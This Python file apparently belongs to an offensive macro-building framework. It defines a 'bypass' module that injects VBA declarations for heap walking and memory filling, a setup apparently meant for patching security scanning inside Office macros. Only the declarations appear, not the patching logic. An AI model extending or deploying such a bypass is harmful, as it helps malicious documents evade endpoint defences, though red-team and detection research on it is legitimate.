
from lib.interfaces.module_interface import ModuleInterface
from lib.handlers.generic import quotedstring
from lib.tab_completers.generic import tab_choice
from lib.validators.generic import ischoice


class Bypass(ModuleInterface):
    def __init__(self, modulepath, helpers):
        options = {}
        self.helpers = helpers
        self.type = "bypass"

        super().__init__(modulepath, options)

    def preprocess(self):
        self.declares.add("""
Type ProcessHeap
    lpData As LongPtr
    cbData As Long
    cbover As Byte
    iRegion As Byte
    flags As Integer
    junk(32) As Byte
End Type""")
        self.declares.add('Private Declare PtrSafe Function GetProcessHeap Lib "kernel32" Alias "GetProcessHeap" () As LongPtr')
        self.declares.add('Private Declare PtrSafe Function HeapWalk Lib "kernel32" Alias "HeapWalk" (ByVal hHeap As LongPtr, ByRef lpEntry As Any) As Boolean')
        self.declares.add('Private Declare PtrSafe Sub RtlFillMemory Lib "kernel32.dll" Alias "RtlFillMemory" (ByVal Destination As LongPtr, ByVal Length As LongPtr, ByVal Fill As Byte)')
        self.declares.add('Private Declare PtrSafe Sub UCTA Lib "NTDLL" Alias "RtlUTF8ToUnicodeN" (ByVal lDestination As LongPtr, ByVal dbytes As Long, ByVal dused As LongPtr, ByVal srcS As LongPtr, ByVal srcB As Long)')

